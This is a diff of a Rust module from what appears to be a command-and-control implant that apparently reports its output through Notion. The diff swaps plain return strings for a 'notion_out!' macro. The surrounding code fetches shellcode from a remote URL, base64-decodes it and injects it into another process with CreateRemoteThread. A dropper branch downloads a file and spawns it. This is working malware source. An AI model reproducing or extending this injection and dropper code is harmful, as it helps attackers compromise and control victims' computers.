@@ -1,6 +1,6 @@
 use std::error::Error;
 use crate::logger::Logger;
-use crate::cmd::CommandArgs;
+use crate::cmd::{CommandArgs, notion_out};
 
 use base64::decode as b64_decode;
 #[cfg(windows)] extern crate winapi;
@@ -148,7 +148,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                 logger.debug(format!("Shellcode URL: {}", &u));
                 url = u; 
             },
-            None    => { return Ok("Could not parse URL".to_string()); }
+            None    => { return notion_out!("Could not parse URL"); }
         };
 
         // Get b64_iterations
@@ -157,10 +157,10 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                 if let Ok(b) = bs.parse::<u32>() {
                     b64_iterations = b;
                 } else {
-                    return Ok("Could not parse b64 iterations".to_string());
+                    return notion_out!("Could not parse b64 iterations");
                 }
             },
-            None => { return Ok("Could not extract b64 iterations".to_string()); }
+            None => { return notion_out!("Could not extract b64 iterations"); }
         };
 
         // CALL get_shellcode
@@ -190,7 +190,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                                 let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                                 kernel32::CloseHandle(h);
                             }
-                            return Ok("Injection completed!".to_string());
+                            return notion_out!("Injection completed!");
                         } else {
                             let err_msg = "Could not parse PID";
                             logger.err(err_msg.to_string());
@@ -287,14 +287,14 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     //}
                 }
 
-                return Ok("Injection completed!".to_string());
+                return notion_out!("Injection completed!");
                 
             },
-            _ => Ok("Unknown injection type!".to_string())
+            _ => notion_out!("Unknown injection type!")
         }
 
     } else {
-        return Ok("Could not parse URL".to_string());
+        return notion_out!("Could not parse URL");
     }
     
          
@@ -324,7 +324,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                         logger.debug(format!("Shellcode URL: {u}"));
                         url = u; 
                     },
-                    None => { return Ok("Could not parse URL".to_string()); }
+                    None => { return notion_out!("Could not parse URL"); }
                 };
 
                 // Get filename
@@ -333,7 +333,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                         logger.debug(format!("Filename: {f}"));
                         filename = f; 
                     },
-                    None => { return Ok("Could not parse filename".to_string()); }
+                    None => { return notion_out!("Could not parse filename"); }
                 };
 
                 let mut download_args = CommandArgs::from_string(
@@ -362,17 +362,17 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     .arg(cmd_string)
                     .spawn()?;
 
-                Ok("Dropper completed!".to_string())
+                notion_out!("Dropper completed!")
             }
-            _ => { return Ok("Unknown injection method!".to_string()) ;}
+            _ => { return notion_out!("Unknown injection method!") ;}
         }
 
     } else {
-        return Ok("No injection type provided!".to_string());
+        return notion_out!("No injection type provided!");
     }
 }
 
 #[cfg(macos)]
 pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
-    Ok("Inject not available on macOS!".to_string())
+    notion_out!("Inject not available on macOS!")
 }
